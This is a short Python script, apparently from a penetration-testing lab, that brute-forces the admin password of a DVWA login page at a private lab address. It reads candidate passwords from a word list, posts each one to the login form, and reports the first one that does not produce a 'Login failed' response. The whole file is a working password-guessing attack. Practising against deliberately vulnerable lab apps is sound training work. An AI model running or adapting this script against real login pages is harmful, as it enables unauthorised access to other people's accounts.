# !/usr/bin/env python

import requests


target_url = "http://192.168.57.130/dvwa/login.php"
login_info = {"username": "admin", "password": "", "Login": "submit"}
with open("./passwords_list.txt", "r") as lines:
    for line in lines:
        word = line.strip()
        login_info["password"] = word
        response = requests.post(target_url, data=login_info)
        if "Login failed" not in response.content:
            print("[+] Got the password ===> " + word)
            exit()


print("[+] Reach end of line.")
